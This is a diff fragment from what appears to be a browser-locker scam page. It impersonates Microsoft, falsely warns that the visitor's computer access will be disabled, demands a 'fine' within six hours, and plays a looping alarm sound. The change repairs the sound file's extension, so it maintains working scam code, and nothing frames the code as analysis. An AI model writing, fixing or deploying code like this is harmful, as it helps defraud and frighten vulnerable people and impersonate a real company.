@@ -13,7 +13,7 @@ var dfbnhfj = '{"title": "Microsoft Corporation",' +
     '"fourthBlock": "<br><b>Attention!</b> If you shutdown this page, access to your computer will be disabled to prevent futher damage to our network.", "timeText": "You have 6 hours to pay the fine.", "timer": "Access code received by SMS"}';
     $(document).ready(function() {
         var audioElement = document.createElement('audio');
-        audioElement.setAttribute('src', 'assets/mp3/sound.mp');
+        audioElement.setAttribute('src', 'assets/mp3/sound.mp3');
     
         audioElement.addEventListener('ended', function() {
             this.play();
